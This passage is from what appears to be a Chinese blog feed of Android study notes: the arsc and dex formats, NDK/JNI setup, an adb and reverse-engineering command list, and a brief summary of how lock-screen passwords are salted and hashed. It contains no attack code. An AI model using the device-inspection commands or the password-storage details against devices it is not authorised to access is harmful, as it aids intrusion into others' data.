id="资源索引表的头部信息（ResTableHeader）"><a href="#资源索引表的头部信息（ResTableHeader）" class="headerlink" title="资源索引表的头部信息（ResTableHeader）"></a>资源索引表的头部信息（ResTableHeader）</h3><p>resource.arsc文件的第一个结构就是资源索引表头部，其结构描述了resource.arsc文件的大小和资源包数量。</p><p>参数：</p><ul><li>header：标准的chunk头部信息格式。</li><li>packageCount：被编译的资源包的个数。</li></ul><h3 id="资源项的值字符串资源池（ResStringPoolHeader）"><a href="#资源项的值字符串资源池（ResStringPoolHeader）" class="headerlink" title="资源项的值字符串资源池（ResStringPoolHeader）"></a>资源项的值字符串资源池（ResStringPoolHeader）</h3><p>接下来紧跟着的是资源项的值字符串资源池，这个字符串资源池包含了所有在资源包里面定义的资源项的值字符串。</p><p>参数：</p><ul><li>header：标准的chunk头部信息结构。</li><li>stringCount：字符串的个数。</li><li>styleCount：字符串样式的个数。</li><li>flags：字符串的属性，可取值包括0x000（UTF-16）、0x001（字符串经过排序）、0x100（UTF-8）和他们的组合值。</li><li>StringStart：字符串内容块相对于其他头部的距离。</li><li>styleStart：字符串样式块相对于其他头部的距离。</li></ul><p>紧跟着头部的是两个偏移数组，分别是字符串偏移数组和字符串样式偏移数组。这两个偏移数组的大小分别等于stringCount和styleCount的值。而每一个元素的类型都是无符号整型。整个字符中资源池结构如图所示：</p><p><img src="./day11/3.jpg" alt=""></p><p>字符串资源池中的前两个字节为字符串长度，如果字符串为UTF-8则以0x00为结束符，UTF-16则以0x0000位结束符。</p><p>字符串和字符串样式位置一一对应。</p><p>字符串样式的结构包含如下两个结构ResStringPool_ref和ResStringPool_span。一个字符串可以对应多个ResStringPool_span和一个ResStringPool_ref。ResStringPool_span在前描述字符串的样式，ResStringPool_ref在后固定值为0xffffffff作为占位符。样式块会以两个值为0xffffffff的ResStringPool_ref作为结束。</p><h3 id="Package数据块（ResTablePackage）"><a href="#Package数据块（ResTablePackage）" class="headerlink" title="Package数据块（ResTablePackage）"></a>Package数据块（ResTablePackage）</h3><p>接着资源项的值字符串资源池后面的部分就是Package数据库，这个数据库记录编译包的元数据。</p><p>参数：</p><ul><li>header：chunk的头部信息数据结构。</li><li>id：包的id，等于Package Id，一般用户包的值Package Id为0x7f，系统资源包的Package Id为0x01。</li><li>name：包名。</li><li>typeString：类型字符串资源池相对头部的偏移。</li><li>lastPublicType：最后一个导出的Public类型字符串在类型字符串资源池中的索引，目前这个值设置为类型字符串资源池的元素个数。</li><li>keyStrings：资源项名称字符串相对头部的偏移。</li><li>lastPublicKey：最后一个导出Public资源项目名称字符串在资源项目名称字符串资源池中的所有，目前这个值设置为资源项名称字符串资源池的元素个数。</li></ul><p>Package数据库的整体结构：</p><p><img src="./day11/4.png" alt=""></p><h3 id="类型规范数据块（ResTableTypeSpec）"><a href="#类型规范数据块（ResTableTypeSpec）" class="headerlink" title="类型规范数据块（ResTableTypeSpec）"></a>类型规范数据块（ResTableTypeSpec）</h3><p>类型规范数据库用来描述资源项中的配置差异性。通过这个差异性描述，可知道每个资源项的配置状况，进而知道在Android资源管理框架在检测到设备配置信息发生变化之后，是否需要重新加载该资源项。</p><p>类型规范数据块是按照类型来组织的，即每一种类型都对应一个类型规范数据块。</p><p>参数：</p><ul><li>header：chunk的头部信息结构。</li><li>id：标识资源的Type ID。Type ID是指资源的类型ID，有animator、anim、color、drawable、layout、menu、raw、string和xml等，每一种都会被赋予一个ID。</li><li>res0：保留，始终为0。</li><li>res1：保留，始终为0。</li><li>entryCount：等于本类型的资源项个数，指名称相同的资源项的个数。</li></ul><p>在这之后紧跟着的是一个大小为entryCount的uint32_t数组，每一个数组元素都用于描述一个资源项的配置差异性。</p><h3 id="资源类型项数据块（ResTableType）"><a href="#资源类型项数据块（ResTableType）" class="headerlink" title="资源类型项数据块（ResTableType）"></a>资源类型项数据块（ResTableType）</h3><p>资源类型数据块用来描述资源项的具体信息，可以用来得知每一个资源项的名称、值、配置等信息。资源类型项数据统一是按照类型和配置来组织的。</p><p>参数：</p><ul><li>header：chunk的头部信息结构。</li><li>id：标识资源的Type ID。</li><li>res0：保留，始终为0。</li><li>res1：保留，始终为0。</li><li>entryCount：等于本类型的资源项个数，指名称相同的资源项的个数。</li><li>entriesStart：等于资源项数据块相对头部的偏移值。</li><li>resConfig：指向一个ResTable_config，用来描述配置信息、地区、语言、分辨率等。</li></ul><p>ResTableType后接着是一个大小为entryCount的uint32_t数组，每一个数组元素都用于描述一个资源类型项数据块的偏移位置。紧跟着的是一个大小为entryCount的ResTable_entry数组，每一个数组元素都用来描述一个资源项的具体信息。</p><p>ResTable_entry根据flags的不同，其后跟随的数据也不同，如果为1，则ResTable_entry是ResTable_map_entry（继承自ResTable_entry，其后跟随count个ResTable_map类型组）；如果为0，则ResTable_entry其后跟随一个Res_value（描述一个普通资源的值）。</p><h2 id="项目下载地址-1"><a href="#项目下载地址-1" class="headerlink" title="项目下载地址"></a>项目下载地址</h2><p><a href="https://github.com/fourbrother/parse_androidarsc" target="_blank" rel="noopener">https://github.com/fourbrother/parse_androidarsc</a></p><h1 id="dex文件格式解析"><a href="#dex文件格式解析" class="headerlink" title="dex文件格式解析"></a>dex文件格式解析</h1><h2 id="dex文件格式"><a href="#dex文件格式" class="headerlink" title="dex文件格式"></a>dex文件格式</h2><p><img src="./day11/5.jpg" alt=""></p><p><img src="./day11/6.png" alt=""></p><h2 id="构造dex文件"><a href="#构造dex文件" class="headerlink" title="构造dex文件"></a>构造dex文件</h2><p>首先创建一个java文件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">hello</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argc)</span></span>&#123;</span><br><span class="line">System.out.println(<span class="string">"hello world!"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后运行命令：</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac hello.java</span><br><span class="line">dx --dex --output=hello.dex hello.class</span><br></pre></td></tr></table></figure><p>其中dx工具在Android SDK路径下：\build-tools\29.0.3\dx.bat</p><p>PS：这里需要用低版本的java环境，因为新版本的class文件dx工具还无法支持。</p><p>接着运行命令：</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">adb root</span><br><span class="line">adb push hello.dex /sdcard</span><br><span class="line">adb shell</span><br><span class="line">dalvikvm -cp /sdcard/hello.dex hello</span><br></pre></td></tr></table></figure><p>-cp是classpath的缩写，hello是要运行的class名称。</p><p>因为命令执行时，dalvikvm会在/data/dalvik-cache/目录下创建.dex文件，因此要求adb的执行shell对目录/data/dalvik-cache/有读写执行的权限。</p><h2 id="解析数据结构"><a href="#解析数据结构" class="headerlink" title="解析数据结构"></a>解析数据结构</h2><h3 id="头部信息Header结构"><a href="#头部信息Header结构" class="headerlink" title="头部信息Header结构"></a>头部信息Header结构</h3><p>header处理描述.dex文件的文件信息外，还有文件里其他各个区域的索引。</p><table><thead><tr><th align="left">字段名称</th><th align="left">偏移值</th><th align="left">长度</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">magic</td><td align="left">0x0</td><td align="left">8</td><td align="left">‘Magic’值，即魔数字段，格式如”dex\n035\0”，其中的035表示结构的版本。</td></tr><tr><td align="left">checksum</td><td align="left">0x8</td><td align="left">4</td><td align="left">校验码。</td></tr><tr><td align="left">signature</td><td align="left">0xC</td><td align="left">20</td><td align="left">SHA-1签名。</td></tr><tr><td align="left">file_size</td><td align="left">0x20</td><td align="left">4</td><td align="left">Dex文件的总长度。</td></tr><tr><td align="left">header_size</td><td align="left">0x24</td><td align="left">4</td><td align="left">文件头长度，009版本=0x5C,035版本=0x70。</td></tr><tr><td align="left">endian_tag</td><td align="left">0x28</td><td align="left">4</td><td align="left">大小端标签，标志dex文件格式为小端，此项一般固定为0x12345678。</td></tr><tr><td align="left">link_size</td><td align="left">0x2C</td><td align="left">4</td><td align="left">连接段的大小，如果为0就表示是静态连接。</td></tr><tr><td align="left">link_off</td><td align="left">0x30</td><td align="left">4</td><td align="left">连接段的开始位置，从本文件头开始算起。如果连接段的大小为0，这里也是0。</td></tr><tr><td align="left">map_off</td><td align="left">0x34</td><td align="left">4</td><td align="left">map item的偏移地址，该item属于data区里的内值要大于等于data_off的大小</td></tr><tr><td align="left">string_ids_size</td><td align="left">0x38</td><td align="left">4</td><td align="left">字符串列表的字符串个数。</td></tr><tr><td align="left">string_ids_off</td><td align="left">0x3C</td><td align="left">4</td><td align="left">字符串列表表偏移值。</td></tr><tr><td align="left">type_ids_size</td><td align="left">0x40</td><td align="left">4</td><td align="left">类型列表里类型个数。</td></tr><tr><td align="left">type_ids_off</td><td align="left">0x44</td><td align="left">4</td><td align="left">类型列表偏移值。</td></tr><tr><td align="left">proto_ids_size</td><td align="left">0x48</td><td align="left">4</td><td align="left">原型列表里原型个数。</td></tr><tr><td align="left">proto_ids_off</td><td align="left">0x4C</td><td align="left">4</td><td align="left">原型列表偏移值。</td></tr><tr><td align="left">field_ids_size</td><td align="left">0x50</td><td align="left">4</td><td align="left">字段列表里字段个数。</td></tr><tr><td align="left">field_ids_off</td><td align="left">0x54</td><td align="left">4</td><td align="left">字段列表偏移值。</td></tr><tr><td align="left">method_ids_size</td><td align="left">0x58</td><td align="left">4</td><td align="left">方法列表里方法个数。</td></tr><tr><td align="left">method_ids_off</td><td align="left">0x5C</td><td align="left">4</td><td align="left">方法列表偏移值。</td></tr><tr><td align="left">class_defs_size</td><td align="left">0x60</td><td align="left">4</td><td align="left">类定义类表中类的个数。</td></tr><tr><td align="left">class_defs_off</td><td align="left">0x64</td><td align="left">4</td><td align="left">类定义列表偏移值。</td></tr><tr><td align="left">data_size</td><td align="left">0x68</td><td align="left">4</td><td align="left">数据段的大小，必须以4字节对齐。</td></tr><tr><td align="left">data_off</td><td align="left">0x6C</td><td align="left">4</td><td align="left">数据段偏移值</td></tr></tbody></table><h3 id="剩余部分数据结构"><a href="#剩余部分数据结构" class="headerlink" title="剩余部分数据结构"></a>剩余部分数据结构</h3><p>略，具体参考上面的图片以及安卓源码中的/dalvik/libdex/DexFile.h文件。</p><h2 id="项目下载地址-2"><a href="#项目下载地址-2" class="headerlink" title="项目下载地址"></a>项目下载地址</h2><p><a href="https://github.com/fourbrother/parse_androiddex" target="_blank" rel="noopener">https://github.com/fourbrother/parse_androiddex</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;AndroidManifest-xml文件格式解析&quot;&gt;&lt;a href=&quot;#AndroidManifest-xml文件格式解析&quot; class=&quot;headerlink&quot; title=&quot;AndroidManifest.xml文件格式解析&quot;&gt;&lt;/a&gt;AndroidMani
      
    
    </summary>
    
    
      <category term="Android" scheme="https://nuoye-blog.github.io/categories/Android/"/>
    
    
      <category term="Android" scheme="https://nuoye-blog.github.io/tags/Android/"/>
    
      <category term="开发" scheme="https://nuoye-blog.github.io/tags/%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>Android-day10</title>
    <link href="https://nuoye-blog.github.io/2020/06/05/Android/Android-day10/"/>
    <id>https://nuoye-blog.github.io/2020/06/05/Android/Android-day10/</id>
    <published>2020-06-05T15:05:00.000Z</published>
    <updated>2020-06-05T15:03:02.056Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Android中的NDK开发"><a href="#Android中的NDK开发" class="headerlink" title="Android中的NDK开发"></a>Android中的NDK开发</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>新建一个，这里命名为NDKbase吧</p><p>然后在java目录同层新建jni目录：new-&gt;folder-&gt;jni folder。</p><p>右键点击app目录，选择Open mode Setting。然后配置其中的SDK Location，使其指向ndk开发环境。</p><p>配置app/build.gradle中的ndx选项：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">defaultConfig &#123;</span><br><span class="line">    applicationId <span class="string">"com.example.ndkbase"</span></span><br><span class="line">    minSdkVersion <span class="number">16</span></span><br><span class="line">    targetSdkVersion <span class="number">29</span></span><br><span class="line">    versionCode <span class="number">1</span></span><br><span class="line">    versionName <span class="string">"1.0"</span></span><br><span class="line">    ndk&#123;</span><br><span class="line">        moduleName <span class="string">"encrypto"</span></span><br><span class="line">        abiFilters <span class="string">"armeabi"</span>, <span class="string">"armeabi-v7a"</span>, <span class="string">"x86"</span></span><br><span class="line">        ldLibs <span class="string">"logs"</span></span><br><span class="line">    &#125;</span><br><span class="line">    testInstrumentationRunner <span class="string">"androidx.test.runner.AndroidJUnitRunner"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中moduleName为so文件名称，abiFilters为支持的体系结构，<code>ldLibs &quot;logs&quot;</code>为增加log的lib库。</p><p>然后再build目录下生成指定的so文件，拷贝到项目的libs目录下即可。</p><h2 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h2><p>参考：<a href="https://blog.csdn.net/zhuowalun8427/article/details/105970017/" target="_blank" rel="noopener">https://blog.csdn.net/zhuowalun8427/article/details/105970017/</a></p><p>因为是java14的，所以命令改成：</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac -h jni -classpath H:\code\Android\nativelib\app\build\intermediates\javac\debug\classes java/com/example/native_lib/myjni.java</span><br></pre></td></tr></table></figure><h2 id="JNIEnv类型和jobject类型"><a href="#JNIEnv类型和jobject类型" class="headerlink" title="JNIEnv类型和jobject类型"></a>JNIEnv类型和jobject类型</h2><h3 id="JNIEnv类型"><a href="#JNIEnv类型" class="headerlink" title="JNIEnv类型"></a>JNIEnv类型</h3><p>JNIEnv类型代表了Java环境，通过JNIEnv* 指针就可以对Java端的代码进行操作。</p><p>JNIEnv类型有很多函数可用：</p><p><code>NewObject</code>：创建Java类中的对象。</p><p><code>NewString</code>：创建Java类中的String对象。</p><p><code>New&lt;Type&gt;Array</code>创建类型为Type的数组对象。</p><p><code>Get&lt;Type&gt;Field</code>获取类型为Type的字段。</p><p><code>Set&lt;Type&gt;Field</code>设置类型为Type的字段的值。</p><p><code>GetStatic&lt;Type&gt;Field</code>获取类型为Type的static的字段。</p><p><code>SetStatic&lt;Type&gt;Field</code>设置类型为Type的static的字段的值。</p><p><code>Call&lt;Type&gt;Method</code>调用返回类型为Type的方法。</p><p><code>CallStatic&lt;Type&gt;Method</code>调用返回类型为Type的static方法。</p><h3 id="jobject参数obj"><a href="#jobject参数obj" class="headerlink" title="jobject参数obj"></a>jobject参数obj</h3><p>如果native方法不是static，obj就代表native方法的类实例。</p><p>如果native方法是static，obj就代表native方法的类的class对象实例。</p><h3 id="Java类型和native中的类型映射关系"><a href="#Java类型和native中的类型映射关系" class="headerlink" title="Java类型和native中的类型映射关系"></a>Java类型和native中的类型映射关系</h3><p>具体可以查看jni.h文件</p><h3 id="jclass类型"><a href="#jclass类型" class="headerlink" title="jclass类型"></a>jclass类型</h3><p>jclass类型用于表示Java中的Class类。</p><p>JNIEnv中有以下几个函数可以取得jclass：</p><p>jclass FindClass(const char* clsName)通过类名（类的全名，包名是用/分割的）来获取jclass。</p><p>jclass GetObjectClass(jobject obj)通过对象实例来获取jclass。</p><p>jclass GetSuperClass(jclass obj)通过jclass获取其父类的jclass对象。</p><h3 id="native中访问Java层代码"><a href="#native中访问Java层代码" class="headerlink" title="native中访问Java层代码"></a>native中访问Java层代码</h3><p>为了在C/C++中表示属性和方法，JNI在jni.h头文件中定义了jfieldId、jmethodID类型来分别代表Java的属性和方法。在访问时，需要先获取ID，然后才能再本地代码中进行操作或调用。</p><p>JNIEnv的如下方法可以获得jfieldId和jmethodID：</p><ul><li>GetFiledID/GetMethodID</li><li>GetStaticFieldID/GetStaticMethodID</li></ul><p>以GetFiledID方法为例，其定义如下：</p><p>GetFiledID(jclass clazz, const char* name, const char* sign)</p><p>其中的三个参数：</p><p>clazz：这个方法依赖的类对象的class对象。</p><p>name：这个字段的名字。</p><p>sign：这个字段的签名。</p><h3 id="JNIEnv类型中方法的使用"><a href="#JNIEnv类型中方法的使用" class="headerlink" title="JNIEnv类型中方法的使用"></a>JNIEnv类型中方法的使用</h3><p>略过</p><h1 id="Android中开发与逆向常用命令总结"><a href="#Android中开发与逆向常用命令总结" class="headerlink" title="Android中开发与逆向常用命令总结"></a>Android中开发与逆向常用命令总结</h1><h2 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h2><p>cat</p><p>echo</p><p>touch</p><h2 id="非shell命令"><a href="#非shell命令" class="headerlink" title="非shell命令"></a>非shell命令</h2><p>需要提前用adb shell命令运行的命令叫做shell命令，直接用adb shell运行的命令叫做非shell命令。</p><ul><li>adb shell dumpsys activity top    可以查看当前应用的activity信息。</li><li>adb shell dumpsys    同上，但会打印四大组件的信息。</li><li>adb shell dumpsys package [pkgname]    可以查询指定包名应用的详细信息（相当于应用的AndroidManifest.xml中的内容）。<br>adb shell dumpsys meminfo [pname/pid]    可以查看指定进程名或进程id的内存信息。</li><li>adb shell dumpsys dbinfo [packagename]    可以查看指定包名应用的数据库存储信息（包括存储的SQL语句）。</li><li>adb install [apk]    安装指定应用宝apk文件，-r参数相当于升级。</li><li>adb uninstall [packagename]    卸载应用。</li><li>adb pull [设备目录文件] [本地目录]    下载设备上的文件到本地。</li><li>adb pull [本地目录] [设备目录文件]    上传本地文件到目录。</li><li>adb shell screencap -p [路径]    截屏。</li><li>adb shell screenrecord [路径]    录屏。</li><li>adb shell input text [content]    输入文本内容。</li><li>adb forward [远程端协议:端口号] [设备端协议:端口号]    设备的端口转发。</li><li>adb jdwp    查看设备中可以被调试的应用的进程号。</li><li>adb logcat    查看当前日志信息。</li></ul><h2 id="shell命令"><a href="#shell命令" class="headerlink" title="shell命令"></a>shell命令</h2><ul><li>run-as [packagename]    可以在非root设备中查看指定debug模式的包名应用沙盒数据。</li><li>ps    查看进程信息。</li><li>pm clear [packagename]    清空指定包名应用的数据</li><li>pm install [apk]    安装apk文件。</li><li>pm uninstall [packagename]    卸载应用。</li><li>am start -n [packagename]/[packagename].[Activity]    启动一个指定活动。debug方式需加-D参数。</li><li>am startservice -n [packagename]/[packagename].[service]    启动一个服务。</li><li>am broadcast -a [广播动作]    发送一个广播。</li><li>netcfg    查看设备的ip地址。</li><li>netstat    查看设备的端口号信息。</li><li>app_process [运行代码目录] [运行主类]    运行java代码。</li><li>dalvikvm -cp [dex文件] [运行主类]    运行一个dex文件。</li><li>top    查看当前应用的CPU消耗信息。</li><li>getprop [属性值名称]    查看系统属性值</li></ul><h2 id="操作apk命令"><a href="#操作apk命令" class="headerlink" title="操作apk命令"></a>操作apk命令</h2><ul><li>aapt dump xmltree [apk包名] [需要查看的资源文件xml]    查看apk中的信息以及编辑apk程序包。</li><li>dexdump [dex文件路径]    查看dex文件的详细信息。</li></ul><h2 id="进程命令"><a href="#进程命令" class="headerlink" title="进程命令"></a>进程命令</h2><h4 id="查看当前进程的内存加载情况"><a href="#查看当前进程的内存加载情况" class="headerlink" title="查看当前进程的内存加载情况"></a>查看当前进程的内存加载情况</h4><p>cat /proc/[pid]/maps</p><h4 id="查看进程的状态信息"><a href="#查看进程的状态信息" class="headerlink" title="查看进程的状态信息"></a>查看进程的状态信息</h4><p>cat /proc/[pid]/status</p><h4 id="查看当前应用使用的端口号信息"><a href="#查看当前应用使用的端口号信息" class="headerlink" title="查看当前应用使用的端口号信息"></a>查看当前应用使用的端口号信息</h4><p>cat /proc/[pid]/net/[四选一：tcp/tcp6/udp/udp6]</p><h1 id="so文件格式解析"><a href="#so文件格式解析" class="headerlink" title="so文件格式解析"></a>so文件格式解析</h1><p>略，参考：《Linux二进制分析》 | nuoye  <a href="https://nuoye-blog.github.io/2020/05/09/%E7%AC%94%E8%AE%B0/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/">https://nuoye-blog.github.io/2020/05/09/%E7%AC%94%E8%AE%B0/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/</a></p><p>具体可直接看书或用命令<code>man 5 elf</code>了解。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Android中的NDK开发&quot;&gt;&lt;a href=&quot;#Android中的NDK开发&quot; class=&quot;headerlink&quot; title=&quot;Android中的NDK开发&quot;&gt;&lt;/a&gt;Android中的NDK开发&lt;/h1&gt;&lt;h2 id=&quot;环境配置&quot;&gt;&lt;a href=&quot;#环
      
    
    </summary>
    
    
      <category term="Android" scheme="https://nuoye-blog.github.io/categories/Android/"/>
    
    
      <category term="Android" scheme="https://nuoye-blog.github.io/tags/Android/"/>
    
      <category term="开发" scheme="https://nuoye-blog.github.io/tags/%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>Android-day9</title>
    <link href="https://nuoye-blog.github.io/2020/06/05/Android/Android-day9/"/>
    <id>https://nuoye-blog.github.io/2020/06/05/Android/Android-day9/</id>
    <published>2020-06-04T16:28:00.000Z</published>
    <updated>2020-06-04T16:28:15.429Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>《第一行代码：Android》这本书的内容已经结束了，接下来就开始看看安全相关的吧，有机会的话再继续深入理论，争取啃回linux内核层。</p><p>接下来的书：《Android应用安全防护和逆向分析》</p><h1 id="Android中锁屏密码加密算法分析"><a href="#Android中锁屏密码加密算法分析" class="headerlink" title="Android中锁屏密码加密算法分析"></a>Android中锁屏密码加密算法分析</h1><h2 id="密码算法分析"><a href="#密码算法分析" class="headerlink" title="密码算法分析"></a>密码算法分析</h2><p>代码：LockPatternUtils.java</p><p>原文密码+设备salt值，然后分别进行MD5和SHA-1操作，转化为hex值再次拼接，得到的就是保存到本地的加密密码内容。</p><p>getSalt方法根据字段key从一个地方获取salt值，如果这个值为0，则随机生成一个，然后保存到那个地方。</p><h1 id="……"><a href="#……" class="headerlink" title="……"></a>……</h1><p>此处省略一万字，内容都是看源码的，有兴趣的可以直接开撸吧，反正思路是那个思路，具体过程看书就好，没啥好记录的感觉。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;《第一行代码：Android》这本书的内容已经结束了，接下来就开始看看安全相关的吧，有机会的话再继续深入理论，争取啃回linux内核层。&lt;/
      
    
    </summary>
    
    
      <category term="Android" scheme="https://nuoye-blog.github.io/categories/Android/"/>
    
    
      <category term="Android" scheme="https://nuoye-blog.github.io/tags/Android/"/>
    
      <category term="开发" scheme="https://nuoye-blog.github.io/tags/%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>Android-day8</title>
    <link href="https://nuoye-blog.github.io/2020/06/03/Android/Android-day8/"/>
    <id>https://nuoye-blog.github.io/2020/06/03/Android/Android-day8/</id>
    <published>2020-06-03T13:40:00.000Z</published>
    <updated>2020-06-03T13:38:50.932Z</updated>
    
    <content type="html"><![CDATA[<h1 id="探究服务"><a href="#探究服务" class="headerlink" title="探究服务"></a>探究服务</h1><h2 id="什么是服务"><a href="#什么是服务" class="headerlink" title="什么是服务"></a>什么是服务</h2><p>服务是Android中实现后台运行的解决方案。</p><p>服务并不是运行在一个独立的进程中，而是依赖于创建服务时所在的应用程序进程。当某个应用程序进程被杀掉时，所有依赖于该进程的服务也会停止运行。</p><p>另外，服务并不会自动开启线程，所有的代码都是默认运行在主线程当中的。</p><h2 id="Android多线程编程"><a href="#Android多线程编程" class="headerlink" title="Android多线程编程"></a>Android多线程编程</h2><h3 id="线程的基本用法"><a href="#线程的基本用法" class="headerlink" title="线程的基本用法"></a>线程的基本用法</h3><p>Android的多线程编程与java多线程编程的语法基本相同：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span> <span class="keyword">extends</span> <span class="title">Thread</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span>myThread().start();</span><br></pre></td></tr></table></figure><p>另外还可以选择Runnable接口的方式来定义线程：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">MyThread myThread = <span class="keyword">new</span> MyThread();</span><br><span class="line"><span class="keyword">new</span> Thread(myThread).start();</span><br></pre></td></tr></table></figure><p>当然，也可以使用匿名类的方式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable()&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;).start();</span><br></pre></td></tr></table></figure><h3 id="在子线程中更新UI"><a href="#在子线程中更新UI" class="headerlink" title="在子线程中更新UI"></a>在子线程中更新UI</h3><p>新建AndroidThreadTest项目，修改布局文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">RelativeLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">"vertical"</span> <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/change_text"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"Change Text"</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/text"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_centerInParent</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"Hello world"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:textSize</span>=<span class="string">"20sp"</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">RelativeLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><p>接下来修改代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 